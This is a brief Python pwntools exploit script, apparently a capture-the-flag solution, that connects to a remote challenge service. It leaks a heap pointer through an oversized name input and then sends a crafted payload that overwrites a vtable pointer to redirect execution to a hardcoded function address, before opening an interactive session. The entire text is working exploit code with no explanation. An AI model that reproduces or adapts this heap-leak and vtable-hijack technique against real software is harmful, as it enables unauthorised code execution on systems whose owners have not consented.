from pwn import *

secret_function = 0x0400AD6

#r = process("./dr")
r = remote("pwn1.tendollar.kr", 20210)
print r.recv()
r.sendline("31337")

# LEAK & SET OFFSET
name = "a"*0x20
print r.recv()
r.send(name)
print r.recvuntil(name)
p_RoomA = u64(r.recvline()[:-1].ljust(8,"\x00"))
log.info("p_RoomA : " + hex(p_RoomA))

# OVERWRITE VTABLE
payload = "\x00"*0x11
payload += p64(p_RoomA + 0x40 + 8)
payload += p64(secret_function)
r.send("1")
print r.recv()
r.send(payload)

r.interactive()
